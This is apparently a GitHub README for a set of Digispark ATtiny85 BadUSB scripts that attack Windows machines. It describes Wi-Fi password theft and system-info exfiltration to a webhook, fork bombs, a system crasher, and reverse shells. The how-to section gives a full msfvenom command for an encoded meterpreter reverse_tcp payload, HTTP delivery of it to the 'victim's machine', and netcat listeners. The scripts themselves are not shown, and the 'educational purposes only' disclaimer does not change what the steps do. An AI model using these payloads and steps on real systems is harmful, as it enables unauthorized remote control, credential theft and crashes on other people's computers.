<h1 align="center">💀Digispark Attiny85 Scripts for Windows💀</h1>

<br>

>
>This repository focuses on the storage of scripts for the digispark and for the dissemination of knowledge. I will update over time as I gain more experience! :)
>

>
>Obs: These scripts are for educational purposes only. Use them at your own risk!
>

>
>Works with Windows, Linux and Termux!
>

<br>

<p align="center">
	<img width="400" height="400" src="https://github.com/EndlssNightmare/Digispark-scripts/assets/110058202/7cf31e71-e6ac-4a74-ac69-3762e93ea66f">
</p>

<br>

<h2 align="left"> Preview</h2>

 <br>

* Fakeupdate :trollface:
* ForkBomb :boom:
* Grab-WindowsSysinfo :alien:
* Metasploit-Revshell :broken_heart:
* Netcat-Revshell :cat:
* Revshell-ps1 :rat:
* Steal-Wifi-Passwd :smiling_imp:
* Wallpaper-Prank :dizzy_face:
* Windows-Crasher :boom:

<br>

<body>
   <h2 align="left"> Dependences</h2>

<br>
	
  >Digistump packages:<a href="https://github.com/digistump/DigistumpArduino"> DigistumpArduino</a>
  >
  >
  >Digispark ABNT2:<a href="https://github.com/jcldf/digisparkABNT2" > DigisparkABNT2</a>
  >
  >
  >Arduino IDE:<a href="https://www.arduino.cc/en/software"> ArduinoIDE</a>
  >
  >
  >Metasploit Framework:<a href="https://www.metasploit.com"> Metasploit Framework</a>

  <br>

  <h2 align="left"> How to use</h2>
<ol type="I">

  <br>

   <h4 align="left"><li>Fakeupdate</li></h4>

  <br>

  This Fakeupdate script opens a fake Windows update website and is configured to be full screen.

  <br>

  **Upload the "Fakeupdate" script to digispark and run it on the target machine.**

  <br>

   <h4 align="left"><li>ForkBomb</li></h4>

  <br>

  This Fork Bomb script will repeat itself until the pc freezes or crashes.

  <br>

  **Upload the "Fork Bomb" script to digispark and run it.**

  <br>

   <h4 align="left"><li>Grab-WindowsSysinfo</li></h4>

  <br>

  Copy and pase your WebHook link on the digispark script.

  <br>

  **Upload the "Grab-WindowsSysinfo" script to digispark and run it on the target machine.**

  <br>

   <h4 align="left"><li>Metasploit-Revshell</li></h4>

  <br>

  Create your own metasploitable file:

  <br>

``` 
msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOURIP lport=443 -e x86/shikata_ga_nai -i 7 -f exe -o exploit.exe
```

 <br>

  Edit the meta.rc file and run the msfconsole:

 <br>

``` 
msfdb reinit && msfconsole -r meta.rc
```

 <br>

  Set your http request on the script (http://yourip/exploit.exe) and listen on your host:

 <br>

``` 
python3 -m http.server 80
```

 <br>

  **Upload the "Metasploit-Revshell" script to digispark and run it on the target machine.**

 <br>

   <h4 align="left"><li>Netcat-Revshell</li></h4>

 <br>

  Set your http server to download NetCat on victim's machine:

 <br>

``` 
python3 -m http.server 80
```

 <br>

  Listen to the port:

 <br>

``` 
nc -lvnp 443 // ncat -lvnp 443 // pwncat-cs -lp 443
```

 <br>

**Upload the "Netcat-Revshell" script to digispark and run it on the target machine.**

 <br>

   <h4 align="left"><li>Revshell-ps1</li></h4>

 <br>

  Save the .ps1 script on your own secret gist repository, copy and paste the raw link on the Arduino IDE.

 <br>

  Listen to the port:

 <br>

``` 
nc -lvnp 443 // ncat -lvnp 443 // pwncat-cs -lp 443
```

 <br>

**Upload the "Revshell-ps1" script to digispark and run it on the target machine.**

 <br>

   <h4 align="left"><li>Steal-Wifi-Passwd</li></h4>

 <br>

  Copy and pase your WebHook link on the digispark script.

 <br>

  **Upload the "Steal-Wifi-Passwd" script to digispark and run it on the target machine.**

 <br>

   <h4 align="left"><li>Wallpaper-Prank</li></h4>
  
 <br>

  This Wallpaper Prank script takes a picture of the desktop, saves it as the background and hides all the icons.

 <br>

  **Upload the "Wallpaper-Prank" script to digispark and run it on the target machine.**

 <br>
  
   <h4 align="left"><li>Windows-Crasher</li></h4>
  
 <br>

  This Windows Crasher script creates a .bat payload on the temporary dir and crashes de Windows.

 <br>

  **Upload the "Windows-Crasher" script to digispark and run it on the target machine.**

 <br>

</ol>

## References and Credits
  
 <br>

  ><a href="https://github.com/CedArctic/DigiSpark-Scripts"> CedArctic</a>
  >
  ><a href="https://github.com/brunomlima/Digispark"> Brunomlima</a>
  >
  ><a href="https://github.com/Gadotti/DigisparkScripts"> Gadotti</a>

 <br>

</body>
</html>
